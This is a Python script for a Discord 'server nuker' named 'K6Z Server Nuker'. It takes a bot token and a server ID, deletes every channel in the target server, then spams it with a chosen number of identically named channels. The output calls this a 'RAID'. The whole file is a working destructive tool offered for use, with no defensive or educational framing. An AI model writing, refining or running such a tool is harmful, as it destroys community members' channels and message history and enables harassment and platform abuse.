import discord
import sys
import colorama
from colorama import Fore, init
import requests
import socket
import os
from discord.ext import commands
import asyncio
import time

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

my_token = ""
my_server_id = ""

async def nuke_server():
    global my_token, my_server_id
    
    print(Fore.RED + f"███▄▄▄▄   ███    █▄     ▄█   ▄█▄    ▄████████    ▄████████ ")
    time.sleep(0.05)
    print(Fore.RED + f"███▀▀▀██▄ ███    ███   ███ ▄███▀   ███    ███   ███    ███ ")
    time.sleep(0.05)
    print(Fore.RED + f"███   ███ ███    ███   ███▐██▀     ███    █▀    ███    █▀  ")
    time.sleep(0.05)
    print(Fore.RED + f"███   ███ ███    ███  ▄█████▀     ▄███▄▄▄      ▄███▄▄▄▄██▀ ")
    time.sleep(0.05)
    print(Fore.RED + f"███   ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ")
    time.sleep(0.05)
    print(Fore.RED + f"███   ███ ███    ███   ███▐██▄     ███    █▄  ▀███████████ ")
    time.sleep(0.05)
    print(Fore.RED + f"███   ███ ███    ███   ███ ▀███▄   ███    ███   ███    ███ ")
    time.sleep(0.05)
    print(Fore.RED + f" ▀█   █▀  ████████▀    ███   ▀█▀   ██████████   ███    ███ ")
    time.sleep(0.05)
    print(Fore.RED + f"                       ▀                        ███    ███ ")
    time.sleep(0.05)
    print("")
    print(Fore.LIGHTCYAN_EX + f"--- K6Z Server Nuker ---")
    time.sleep(0.05)
    print("")
    
    
    my_token = input(Fore.LIGHTCYAN_EX + f"Bot Token : ").strip()
    my_server_id = input(Fore.LIGHTCYAN_EX + f"Server ID : ").strip()

    if not my_token or not my_server_id:
        print("Erreur : Paramètres manquants.")
        return

    print(f"Connection to server ID : {my_server_id}...")
    await bot.start(my_token)

@bot.event
async def on_ready():
    await asyncio.sleep(3) 
    
    server = None
    
    server = bot.get_guild(int(my_server_id))
    
    if not server:
        for guild in bot.guilds:
            if str(guild.id) == str(my_server_id):
                server = guild
                break

    if not server:
        print(f"ERROR: The bot could not find the server with the ID {my_server_id}.")
        print(f"[DEBUG] Bot connected to {len(bot.guilds)} server(s)")
        for guild in bot.guilds:
            print(f" - Name: {guild.name} | ID: {guild.id}")
        await bot.close()
        return

    print("")
    time.sleep(0.05)
    print(Fore.GREEN + f"Connected as {bot.user.name}.")
    time.sleep(0.05)
    print(Fore.GREEN + f"Target server found : {server.name}")
    print("")
    time.sleep(0.05)
    print(Fore.RED + f"    RAID IN PROGRESS... ")
    time.sleep(3)
    print("")

    try:
        
        channels_to_delete = list(server.channels)
        print(Fore.LIGHTCYAN_EX + f"Channels to delete : {len(channels_to_delete)}")

        
        for channel in channels_to_delete:
            try:
                await channel.delete()
                print(Fore.GREEN +f"Deleted : {channel.name}")
            except Exception as e:
                print(Fore.RED + f"Error deleting {channel.name} : {e}")

        print(Fore.GREEN + f"Channels deleted.")
        print("")
                
        print(Fore.LIGHTCYAN_EX + f"--- CHANNEL SETUP ---")
        print("")
        
        channel_name = input(Fore.LIGHTCYAN_EX + f"Enter the name for the channel : ").strip()
        
        if not channel_name:
            print(Fore.RED + f"Name cannot be empty.")
            return

        while True:
            try:
                duplicate_count = int(input(Fore.LIGHTCYAN_EX + f"How many times do you want to duplicate this channel? : "))
                if duplicate_count > 0:
                    break
                else:
                    print(Fore.RED + f"Please enter a number greater than 0.")
            except ValueError:
                print(Fore.RED + f"Invalid number. Please enter an integer.")

        print("")
        print(Fore.GREEN + f"Creating {duplicate_count} channel(s) named '{channel_name}'...")

        for i in range(duplicate_count):
            try:
                await server.create_text_channel(channel_name)
                print(Fore.GREEN + f"Created with succes : {channel_name}")
                await asyncio.sleep(0.5) 
            except Exception as e:
                print(Fore.RED + f"Error creating channel : {e}")
                print("Attempting to retry in 10 seconds...")
                await asyncio.sleep(10)

        print("")
        print(Fore.RED + f"    RAID COMPLETED ! ")
        

    except Exception as e:
        print(f"CRITICAL ERROR : {e}")
        input("Close the program.")

if __name__ == "__main__":
    asyncio.run(nuke_server())
